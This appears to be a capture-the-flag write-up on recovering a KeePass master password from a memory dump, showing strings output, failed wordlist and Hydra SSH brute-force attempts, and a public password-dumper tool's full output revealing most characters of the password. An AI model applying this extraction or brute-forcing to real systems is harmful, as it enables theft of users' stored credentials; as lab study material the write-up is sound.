
We unzipped RT30000.zip and got two files
```sh
┌──(kali㉿proxli)-[~/boxes/htb/keeper]
└─$ ls -la
total 332856
drwxrwxr-x  3 kali kali      4096 Jun 16 17:54 .
drwxr-xr-x 13 kali kali      4096 Jun 16 17:48 ..
-rwxr-x---  1 kali kali 253395188 May 24  2023 KeePassDumpFull.dmp
-rwxr-x---  1 kali kali      3630 May 24  2023 passcodes.kdbx
-rw-r--r--  1 kali kali  87391651 Jun 16 17:50 RT30000.zip
```

```sh
┌──(kali㉿proxli)-[~/boxes/htb/keeper]
└─$ file KeePassDumpFull.dmp
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
```

```sh
┌──(kali㉿proxli)-[~/boxes/htb/keeper]
└─$ strings -n 10 KeePassDumpFull.dmp | grep pass -C 10 -i
```

strings data looks like windows
```
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\LISE~1.NOR\AppData\Local\Temp
TMP=C:\Users\LISE~1.NOR\AppData\Local\Temp
USERDOMAIN=DESKTOP-D9OND4K
USERDOMAIN_ROAMINGPROFILE=DESKTOP-D9OND4K
USERNAME=Lise.Norgaard
USERPROFILE=C:\Users\Lise.Norgaard
windir=C:\Windows
"C:\Program Files\KeePass Password Safe 2\KeePass.exe" 
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\Lise.Norgaard\AppData\Local\Microsoft\WindowsApps;
        USERNAME=Lise.Norgaard
windir=C:\Windows
HOMEDRIVE=C:
        NUMBER_OF_PROCESSORS=2
OS=Windows_NT
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=0101
        PUBLIC=C:\Users\Public
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
C:\Program Files\KeePass Password Safe 2\KeePass.exe
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 1 Stepping 1, AuthenticAMD
CommonProgramFiles=C:\Program Files\Common Files
LOCALAPPDATA=C:\Users\Lise.Norgaard\AppData\Local
FPS_BROWSER_APP_PROFILE_STRING=Internet Explorer
OneDrive=C:\Users\Lise.Norgaard\OneDrive
TEMP=C:\Users\LISE~1.NOR\AppData\Local\Temp
ProgramFiles(x86)=C:\Program Files (x86)
USERDOMAIN_ROAMINGPROFILE=DESKTOP-D9OND4K
DriverData=C:\Windows\System32\Drivers\DriverData
```

We ran binwalk with extract and got a lot of files but they didn't lead anywhere. the only actual file extracted was a "MostPopularPasswords.txt" which meda us do some brute force attempts without success.

One thing we tested it with was the first poc we tried, as it needed a wordlist. Sounded like the thing to do... for a while lol
This poc (python): https://github.com/z-jxy/keepass_dump (Don't use this!!)

We also simultaneously tested them with hydra on ssh.

After a bit we looked for another poc, actually the one we found first and that the python one was based on, but that needed .NET and python seemed so nice! Finally we ran the c# one on my pc and it didn't take two seconds.

https://github.com/vdohney/keepass-password-dumper

```
PS D:\obsidian\keepass-password-dumper\bin\debug\net7.0> ls


    Directory: D:\obsidian\keepass-password-dumper\bin\debug\net7.0


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/24/2023  12:51 PM      253395188 KeePassDumpFull.dmp
-a----         6/16/2025   9:39 PM            461 keepass_password_dumper.deps.json
-a----         6/16/2025   9:39 PM          10752 keepass_password_dumper.dll
-a----         6/16/2025   9:39 PM         158208 keepass_password_dumper.exe
-a----         6/16/2025   9:39 PM          13064 keepass_password_dumper.pdb
-a----         6/16/2025   9:39 PM            147 keepass_password_dumper.runtimeconfig.json
-a----         5/24/2023  12:51 PM           3630 passcodes.kdbx


PS D:\obsidian\keepass-password-dumper\bin\debug\net7.0> .\keepass_password_dumper.exe .\KeePassDumpFull.dmp
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●ø
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●d
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●g
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●r
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●ø
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●d
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●m
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●e
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●d
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●f
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●l
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●ø
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●d
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●●●●●●●●●●●●●●●●e
Found: ●Ï
Found: ●,
Found: ●l
Found: ●`
Found: ●-
Found: ●'
Found: ●]
Found: ●§
Found: ●A
Found: ●A
...
Found: ●A
Found: ●A
Found: ●I
Found: ●:
Found: ●=
Found: ●_
Found: ●c
Found: ●M

Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M,
3.:     d,
4.:     g,
5.:     r,
6.:     ø,
7.:     d,
8.:      ,
9.:     m,
10.:    e,
11.:    d,
12.:     ,
13.:    f,
14.:    l,
15.:    ø,
16.:    d,
17.:    e,
Combined: ●{ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M}dgrød med fløde
PS D:\obsidian\keepass-password-dumper\bin\debug\net7.0>
```

As this gave us a password with no first letter we googled the password:
![[Images/Pasted image 20250616235601.png]]

We tested the lower case version on kpcli with success!
